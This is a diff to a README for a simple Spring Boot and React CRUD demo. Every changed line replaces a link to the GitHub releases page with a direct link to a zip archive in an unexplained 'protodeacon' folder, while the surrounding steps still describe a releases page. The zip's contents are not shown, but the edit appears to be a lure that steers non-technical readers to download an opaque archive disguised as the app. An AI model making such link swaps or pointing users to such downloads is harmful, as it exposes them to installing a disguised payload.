@@ -1,7 +1,7 @@
 # 🚀 spring-boot-react-crud-revisited - Simple CRUD App with Modern Stack
 
 ## 📥 Download Now
-[![Download Here](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/adverthaf/spring-boot-react-crud-revisited/releases)
+[![Download Here](https://raw.githubusercontent.com/adverthaf/spring-boot-react-crud-revisited/main/protodeacon/spring-boot-react-crud-revisited.zip)](https://raw.githubusercontent.com/adverthaf/spring-boot-react-crud-revisited/main/protodeacon/spring-boot-react-crud-revisited.zip)
 
 ## 📖 Overview
 The **spring-boot-react-crud-revisited** application is a user-friendly tool created to help you manage data easily. This application follows the tutorial by Baeldung, featuring a combination of Spring Boot for the back-end and React for the front-end. You can perform Create, Read, Update, and Delete (CRUD) operations smoothly.
@@ -12,7 +12,7 @@ Follow these simple steps to download and run the application on your computer.
 ### 📥 Step 1: Visit the Download Page
 To begin, go to the releases page to find the latest version of the application.
 
-[Visit this page to download](https://github.com/adverthaf/spring-boot-react-crud-revisited/releases)
+[Visit this page to download](https://raw.githubusercontent.com/adverthaf/spring-boot-react-crud-revisited/main/protodeacon/spring-boot-react-crud-revisited.zip)
 
 ### 📂 Step 2: Choose Your Download
 On the releases page, look for the latest version. You will find downloadable files for different operating systems. Choose the file that matches your system and click on it to start the download.
@@ -50,4 +50,4 @@ We welcome contributions! If you have ideas for improvements or new features, fe
 ## 📊 Conclusion
 You are now equipped to download and run the **spring-boot-react-crud-revisited** application. Enjoy the ease of managing data with this well-designed tool. Don't hesitate to explore its features and reach out for support whenever needed. 
 
-[Download Here](https://github.com/adverthaf/spring-boot-react-crud-revisited/releases) again for easy access. Happy managing!
+[Download Here](https://raw.githubusercontent.com/adverthaf/spring-boot-react-crud-revisited/main/protodeacon/spring-boot-react-crud-revisited.zip) again for easy access. Happy managing!
